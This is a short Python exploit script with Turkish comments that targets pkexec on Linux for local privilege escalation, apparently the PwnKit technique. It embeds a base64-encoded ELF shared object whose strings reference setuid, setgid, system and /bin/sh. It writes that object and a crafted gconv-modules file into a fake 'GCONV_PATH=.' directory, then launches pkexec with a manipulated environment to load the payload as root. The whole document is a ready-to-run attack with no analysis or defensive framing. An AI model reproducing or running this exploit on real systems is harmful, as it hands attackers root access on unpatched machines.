import os
import base64

# Base64 encoded shared object payload (bu gcc gerektirmeden çalışmasını sağlar)
payload = b"""f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAwAEAAAAAAABAAAAAAAAAAOgBAAAAAAAAAAAAAAAA
AAAAAAAAAAQAIAABAAAAAAAAAAEAAAAAAAAAAQAAABAAAABwAQAAAAAAAHABAAAAAAAAcAEAAAAA
AAAAAQAAAAAAAAACAAAAAwAAAPT/AAA8AQAAAAAAADwBAAAAAAAAPAEAAAAAAAA8AQAAAAAAADwB
AAAAAAAAAAQAAAAAAAAABAAAABQAAAAAAAAAAAAAAA0AAAAAAAAADQAAAAAAAAANAAAAAAAAAAAA
AAAFAAAAAAAAAAMAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAwAAAD8/wAAOAEAAAAAAAA4AQAAAAAAADgBAAAAAAAAOAEAAAAA
AAA4AQAAAAAAAAAEAAAAAAAAAAQAAAAFAAAAAAAAAAAAAAAA4AAAAAAAAADgAAAAAAAAAOAAAAAA
AAAAAAAAAQAAAAAAAAADAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAAAAAAQA8f8AAAAAAAACAPX/AAAAAAEA+v8AAAAAABAA
AAAAAAAAAAAAAABwAQAAAAAAAHABAAAAAAAAcAEAAAAAAAAAAAAAAAAAAAAAAQAAABwAAADoAQAA
AAAAAOgBAAAAAAAA6AEAAAAAAADoAQAAAAAAAOgBAAAAAAAAACAAAAAAAAEAAAADAAAAAAAAAAAA
AAAAOAEAAAAAAAA4AQAAAAAAADgBAAAAAAAAOAEAAAAAAAAJAAAAAAAAAAEAAAAMAAAAAAAAAAAA
AAAAOAEAAAAAAAA4AQAAAAAAADgBAAAAAAAAOAEAAAAAAAAEAAAAAAAAAAIAAAANAAAAAAAAAAAA
AAAAOAEAAAAAAAA4AQAAAAAAADgBAAAAAAAAOAEAAAAAAAAEAAAAAAAAAAcAAAAbAAAAAAAAAAAA
AAAAcAEAAAAAAABwAQAAAAAAAHABAAAAAAAACAAAAAAAAAAIAAAAAAAAAAEAAAAGAAAA4AEAAAAA
AADgAQAAAAAAAOABAAAAAAAACAAAAAAAAAAIAAAAAAAAAAIwMzQAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAABzAGgAAAAAAHAAAABgAAAAAAAAAGAAAAAAAAAAYAAAAAAAAABgAAAAAAAAAGAA
AAAAAAAAEAAAAAAAAAA2AAAAEAAAAGAAAAAAAAAAYAAAAAAAAABgAAAAAAAAAGAAAAAAAAAAYAAA
AAAAAAQAAAAAAAAAFAAAABwAAABwAQAAAAAAAHABAAAAAAAAcAEAAAAAAAAYAAAAAAAAABgAAAAA
AAAABAAAAAAAAAAHAAAAOAAAADgBAAAAAAAAOAEAAAAAAAA4AQAAAAAAAAgAAAAAAAAACAAAAAAA
AAABAAAASAAAAOgBAAAAAAAA6AEAAAAAAADoAQAAAAAAABAAAAAAAAAAEAAAAAAAAAAIAAAAVAAA
AHABAAAAAAAAcAEAAAAAAABwAQAAAAAAAAYAAAAAAAAABgAAAAAAAAACAAAAAAAAAGxpYmMuc28u
NgBzZXR1aWQAc3lzdGVtAHNldGdpZABfX2N4YV9maW5hbGl6ZQBHTElCQ18yLjIuNQBHTElCQ18y
LjMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAABAAwAAAAAAAEABgB2AAAABwABAAAAAAADAAYAAAAAAAEABgAAAAAAAgAGAAAAAAABAAQA
HwAAAAcAAQAAAAAABgAAAAEAAAACAAAAAAAAAAIAAAAAAAAAAAAAAAAAAAA4AQAAAAAAAAgAAAAA
AAAAX2l0bQAgAAAAAAAAAAAAAAA4AQAAAAAAAAgAAAAAAAAAbHdtAGIAAAAAAAAAAAAAADgBAAAA
AAAACAAAAAAAAAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAPbdQ6x1AAAAMtthD7f8O30IdQqA/gI5
6w+2+FteXf/gZg8fRAAAuv////9mDx9EAABIieVIjQ1WAAAAAdtJjT1QAAAA6KUAAAD/0LgAAAAA
SIXAdBI7fRB1C2aD7whmDx+EAAAAAABIhcB0B2aD7wRmDx9EAABIg+wISInlSIP4AnQOSIPCBEiD
+AF0BUiD+AR00FteXf/gSIPsCEiJ5UiD+AJ0DkiDwgRIg/gBdAVIg/gEdNbbYQ+3/FteXf/gZg8f
RAAAuv////9mDx9EAABIg+wISInlSIP4AnQOSIPCBEiD+AF0BUiD+AR00FteXf/gSIPsCEiJ5UiD
+AJ0DkiDwgRIg/gBdAVIg/gEdNbbYQ+3/FteXf/gsAAAAH/iaW4vc2gA"""

def exploit():
    # Klasör yapılarını oluştur
    os.system("mkdir -p 'GCONV_PATH=.'")
    os.system("touch 'GCONV_PATH=./pwnkit'")
    os.system("chmod a+x 'GCONV_PATH=./pwnkit'")
    os.system("mkdir -p pwnkit")
    
    # Zararlı payload'ı dosyaya yaz (.so dosyası)
    with open("pwnkit/pwnkit.so", "wb") as f:
        f.write(base64.b64decode(payload))
        
    # Gconv yapılandırma dosyasını yaz
    with open("pwnkit/gconv-modules", "w") as f:
        f.write("module UTF-8// PWNKIT// pwnkit 2\n")
    
    # Ortam değişkenlerini ayarla ve pkexec'i tetikle
    env = {
        "pwnkit": "pwnkit",
        "PATH": "GCONV_PATH=.",
        "CHARSET": "PWNKIT",
        "SHELL": "pwnkit",
    }
    os.execve("/usr/bin/pkexec", ["/usr/bin/pkexec"], env)

if __name__ == "__main__":
    exploit()
